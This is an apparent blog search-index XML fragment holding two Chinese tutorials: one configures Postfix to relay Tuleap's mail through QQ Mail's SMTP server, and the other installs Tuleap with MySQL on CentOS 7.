    <content type="text"><![CDATA[Tuleap使用postfix作为邮件转发工具，自行搭建邮件服务器比较麻烦，我们可以使用postfix + smtp实现发送邮件的功能，这里以QQ邮箱为例，Gmail、163等同理。 配置main.cf123456789101112131415161718192021$ vim /etc/postfix/main.cf#修改inet_interfaces = localhostinet_interfaces = all#在文件最后添加myhostname = tuleap.example.commyorigin = $mydomainrelayhost = [smtp.qq.com]:587# Enable SASL authenticationsmtp_sasl_auth_enable = yes# Disallow methods that allow anonymous authenticationsmtp_sasl_security_options = noanonymous# Location of sasl_passwdsmtp_sasl_password_maps = hash:/etc/postfix/sasl/sasl_passwd# Enable STARTTLS encryptionsmtp_tls_security_level = encrypt# Location of CA certificatessmtp_tls_CAfile = /etc/postfix/server.pemsmtp_generic_maps = hash:/etc/postfix/generic 配置QQ邮箱SMTP账户生成QQ邮箱smtp服务token 创建账户配置文件 1234$ mkdir /etc/postfix/sasl$ vim /etc/postfix/sasl/sasl_passwd[smtp.qq.com]:587 xxxxxxxx@qq.com:token 创建hash加密文件sasl_passwd.db 1$ postmap /etc/postfix/sasl/sasl_passwd 创建CA证书12345678$ cd /etc/ssl/certs/$ vim Makefile# 修改证书有效期 DAYS 为合适的时间DAYS=xxx$ make server.pem$ mv server.pem /etc/postfix 添加账号映射Tuleap的邮件发信人为noreply@tuleap.example.com QQ邮箱SMTP的发件人为sasl_passwd中设置的账号 账号不同时，QQ邮箱会返回报错mail from address must be same as authorization user 1234$ vim /etc/postfix/generic#在文件最后添加noreply@tuleap.example.com xxxxx@qq.com 测试postfix重启postfix 1$ service postfix restart 登陆tuleap，测试邮件发送功能，如果收不到邮件，查看maillog发送日志排查错误 1$ cat /var/log/maillog]]></content>
      <categories>
        <category>Tuleap</category>
      </categories>
      <tags>
        <tag>tuleap</tag>
        <tag>postfix</tag>
        <tag>mail</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Tuleap的安装]]></title>
    <url>%2F2018%2F11%2F21%2Ftuleap-install%2F</url>
    <content type="text"><![CDATA[系统CentOS 7 关闭SElinux修改selinux配置文件 12345678910111213$ vim /etc/selinux/config# This file controls the state of SELinux on the system.# SELINUX= can take one of these three values:# enforcing - SELinux security policy is enforced.# permissive - SELinux prints warnings instead of enforcing.# disabled - No SELinux policy is loaded.SELINUX=disabled# SELINUXTYPE= can take one of three two values:# targeted - Targeted processes are protected,# minimum - Modification of targeted policy. Only selected processes are protected.# mls - Multi Level Security protection.SELINUXTYPE=targeted 重启服务器 1$ shutdown -r now 验证selinux已关闭 123$ sestatusSELinux status: disabled 安装安装EPEL12$ yum install -y epel-release$ yum install -y centos-release-scl 安装 remi-safe 库1$ yum install -y https://rpms.remirepo.net/enterprise/remi-release-7.rpm 安装 Tuleap 库12345678$ vim /etc/yum.repos.d/Tuleap.repo[Tuleap]name=Tuleapbaseurl=https://ci.tuleap.net/yum/tuleap/rhel/7/dev/$basearchenabled=1gpgcheck=1gpgkey=https://ci.tuleap.net/yum/tuleap/gpg.key 安装 Tuleap12345678$ yum install -y \ rh-mysql57-mysql-server \ tuleap-plugin-agiledashboard \ tuleap-plugin-graphontrackers \ tuleap-theme-burningparrot \ tuleap-theme-flamingparrot \ tuleap-plugin-git \ tuleap-plugin-pullrequest 更多插件安装详见官方插件列表 配置数据库1234$ vim /etc/opt/rh/rh-mysql57/my.cnf.d/rh-mysql57-mysql-server.cnf#在[mysqld]下添加sql-mode=NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION 设置mysql开机自启 1$ systemctl enable rh-mysql57-mysqld 启动mysql 1$ systemctl start rh-mysql57-mysqld 设置mysql密码 1$ scl enable rh-mysql57 "mysqladmin -u root password" 启动 请勿重复执行该命令 12345/usr/share/tuleap/tools/setup.el7.sh \ --configure \ --server-name=tuleap.example.com \ --mysql-server=localhost \ --mysql-password=XXXXX server-name : 本地测试时设为localhost 确保防火墙开放所需端口 Web (TCP/80 &amp; TCP/443) SSH (git, admin): TCP/22 首次登陆登陆Tuleap (例如: tuleap.example.com) 默认的管理员密码在 /root/.tuleap_passwd 中可以找到]]></content>
      <categories>
        <category>Tuleap</category>
      </categories>
      <tags>
        <tag>tuleap</tag>
        <tag>php</tag>
        <tag>agile management</tag>
      </tags>
  </entry>
</search>
